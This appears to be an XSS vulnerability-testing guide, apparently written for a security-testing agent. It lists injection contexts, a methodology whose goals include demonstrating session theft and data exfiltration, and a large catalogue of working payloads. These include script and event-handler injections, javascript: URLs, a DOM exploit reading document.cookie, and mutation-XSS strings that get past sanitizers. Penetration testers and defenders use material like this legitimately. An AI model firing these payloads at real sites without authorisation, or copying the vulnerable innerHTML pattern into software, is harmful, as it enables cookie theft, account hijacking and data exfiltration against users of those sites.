<xss_vulnerability_testing_guide>
<title>CROSS-SITE SCRIPTING (XSS) VULNERABILITY TESTING</title>

<critical>XSS remains highly prevalent due to context complexity, parser behavior differences, and framework-specific sinks. Treat every user-influenced string as untrusted until strictly encoded for the exact output context and protected by runtime policies (CSP/Trusted Types).</critical>

<scope>
- Reflected XSS (non-persistent, immediate execution)
- Stored XSS (persistent, executed on page load)
- DOM-based XSS (client-side manipulation)
- Mutation XSS (mXSS - parser differential attacks)
- Universal XSS (browser/framework vulnerabilities)
- Multi-context XSS (HTML, JavaScript, CSS, URL contexts)
</scope>

<methodology>
1. **Identify input points**: URL parameters, form fields, search boxes, file uploads, JSON APIs
2. **Trace data flow**: Where does input appear in response? HTML body, attributes, JavaScript, CSS?
3. **Determine context**: HTML element, attribute value, JavaScript string, URL, CSS property
4. **Select appropriate payload**: Context-specific payload that breaks out and executes
5. **Test execution**: Observe JavaScript execution (alert, console, network request)
6. **Validate impact**: Demonstrate session theft, action hijacking, or data exfiltration
</methodology>

<context_detection>
# HTML Element Context
<div>USER_INPUT_HERE</div>
Test: <script>alert(1)</script>

# HTML Attribute Context
<input value="USER_INPUT_HERE">
Test: "><script>alert(1)</script>

# JavaScript String Context
<script>var x = "USER_INPUT_HERE";</script>
Test: ";alert(1);//

# JavaScript Template Literal
<script>var x = `USER_INPUT_HERE`;</script>
Test: {% raw %}${alert(1)}{% endraw %}

# URL Context
<a href="USER_INPUT_HERE">Link</a>
Test: javascript:alert(1)

# CSS Context
<style>body { background: USER_INPUT_HERE; }</style>
Test: red;}body{background:url('javascript:alert(1)')
</context_detection>

<payload_catalog>
# Basic HTML context
<script>alert(document.domain)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<iframe src="javascript:alert(1)">
<body onload=alert(1)>

# Attribute context (breaking out of quotes)
" autofocus onfocus=alert(1) x="
' autofocus onfocus=alert(1) x='
" onmouseover=alert(1) x="

# Event handlers
<img src=x onerror=alert(1)>
<img src=x onload=alert(1)>
<svg/onload=alert(1)>
<input onfocus=alert(1) autofocus>
<select onfocus=alert(1) autofocus>
<textarea onfocus=alert(1) autofocus>
<body onload=alert(1)>
<body onpageshow=alert(1)>

# JavaScript context breaks
";alert(1);//
';alert(1);//
{% raw %}`${alert(1)}`{% endraw %}
</script><script>alert(1)</script>

# URL context
javascript:alert(1)
data:text/html,<script>alert(1)</script>
vbscript:msgbox(1)

# Markdown/Rich Text
[Click](javascript:alert(1))
![XSS](https://example.com/x.jpg" onerror="alert(1))
</payload_catalog>

<advanced_techniques>
<dom_based_xss>
# Sources (user input)
- location.hash
- location.search
- document.referrer
- postMessage events
- localStorage/sessionStorage
- document.cookie

# Sinks (dangerous operations)
- innerHTML / outerHTML
- document.write() / document.writeln()
- eval() / setTimeout() / setInterval() with string
- element.setAttribute()
- location.href / location.assign()

# Example vulnerable pattern
const params = new URLSearchParams(location.search);
const name = params.get('name');
document.getElementById('welcome').innerHTML = 'Hello ' + name;

# Exploit
?name=<img src=x onerror=alert(document.cookie)>
</dom_based_xss>

<mutation_xss>
# Browser parser mutations that bypass sanitizers
<noscript><p title="</noscript><img src=x onerror=alert(1)>">
<form><button formaction=javascript:alert(1)>Click
<svg><style><img src=x onerror=alert(1)></style>
</mutation_xss>

